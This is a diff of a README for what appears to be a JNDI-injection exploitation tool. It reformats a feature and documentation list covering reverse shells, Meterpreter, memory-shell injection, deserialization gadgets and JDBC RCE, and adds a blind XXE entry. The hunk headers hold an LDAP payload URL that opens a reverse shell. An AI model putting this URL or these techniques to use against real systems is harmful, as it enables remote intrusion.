@@ -40,29 +40,12 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - Spawn Meterpreter 
 - Load custom Java bytecode
 - MemShell injection (based on [MemShellParty](https://github.com/ReaJason/MemShellParty))
+- High version JDK Bypass
+  - BeanFactory Bypass (Tomcat/Groovy/XStream, etc.)
+  - JDBC RCE (MySQL/PostgreSQL/H2/Derby)
+  - Tomcat Blind XXE
+- LDAP Deserialization (including common gadgets)
 - Customize payload based on Nashorn JS engine
-- BeanFactory Bypass
-    - Tomcat
-    - Groovy
-    - XStream
-    - SnakeYaml
-    - BeanShell
-    - MVEL
-    - MLet
-    - NativeLibLoader
-- JDBC RCE (MySQL/PostgreSQL/H2/Derby)
-    - Commons DBCP
-    - Tomcat DBCP
-    - Tomcat JDBC
-    - Alibaba Druid
-    - HikariCP
-- LDAP Deserialization:
-    - CommonsCollections K1-K4
-    - CommonsBeanutils183
-    - CommonsBeanutils194
-    - Jackson
-    - Fastjson1
-    - Fastjson2
 
 ## 📖 Documentation
 
@@ -73,23 +56,24 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - [Basic Functions](USAGE.en.md#basic-functions)
 - [MemShell Injection](USAGE.en.md#memshell-injection)
 - [BeanFactory Bypass](USAGE.en.md#beanfactory-bypass)
-    - [Tomcat ELProcessor](USAGE.en.md#tomcat-elprocessor)
-    - [Groovy ClassLoader/Shell](USAGE.en.md#groovy-classloadershell)
-    - [XStream](USAGE.en.md#xstream)
-    - [SnakeYaml](USAGE.en.md#snakeyaml)
-    - [BeanShell](USAGE.en.md#beanshell)
-    - [MVEL](USAGE.en.md#mvel)
-    - [MLet](USAGE.en.md#mlet)
-    - [NativeLibLoader](USAGE.en.md#nativelibloader)
+  - [Tomcat ELProcessor](USAGE.en.md#tomcat-elprocessor)
+  - [Groovy ClassLoader/Shell](USAGE.en.md#groovy-classloadershell)
+  - [XStream](USAGE.en.md#xstream)
+  - [SnakeYaml](USAGE.en.md#snakeyaml)
+  - [BeanShell](USAGE.en.md#beanshell)
+  - [MVEL](USAGE.en.md#mvel)
+  - [MLet](USAGE.en.md#mlet)
+  - [NativeLibLoader](USAGE.en.md#nativelibloader)
 - [JDBC RCE](USAGE.en.md#jdbc-rce)
-    - [MySQL](USAGE.en.md#mysql)
-        - [MySQL JDBC Deserialization RCE](USAGE.en.md#mysql-jdbc-deserialization-rce)
-        - [MySQL Client Arbitrary File Read](USAGE.en.md#mysql-client-arbitrary-file-read)
-    - [PostgreSQL](USAGE.en.md#postgresql)
-    - [H2 Database](USAGE.en.md#h2)
-    - [Apache Derby](USAGE.en.md#derby)
-        - [Derby SQL RCE](USAGE.en.md#derby-sql-rce)
-        - [Derby Master-Slave Replication Deserialization RCE](USAGE.en.md#derby-master-slave-replication-deserialization-rce)
+  - [MySQL](USAGE.en.md#mysql)
+    - [MySQL JDBC Deserialization RCE](USAGE.en.md#mysql-jdbc-deserialization-rce)
+    - [MySQL Client Arbitrary File Read](USAGE.en.md#mysql-client-arbitrary-file-read)
+  - [PostgreSQL](USAGE.en.md#postgresql)
+  - [H2 Database](USAGE.en.md#h2)
+  - [Apache Derby](USAGE.en.md#derby)
+    - [Derby SQL RCE](USAGE.en.md#derby-sql-rce)
+    - [Derby Master-Slave Replication Deserialization RCE](USAGE.en.md#derby-master-slave-replication-deserialization-rce)
+- [Tomcat Blind XXE](USAGE.en.md#tomcat-blind-xxe)
 - [LDAP Deserialization](USAGE.en.md#ldap-deserialization)
 - [Script](USAGE.en.md#script)
 - [useReferenceOnly](USAGE.en.md#usereferenceonly)
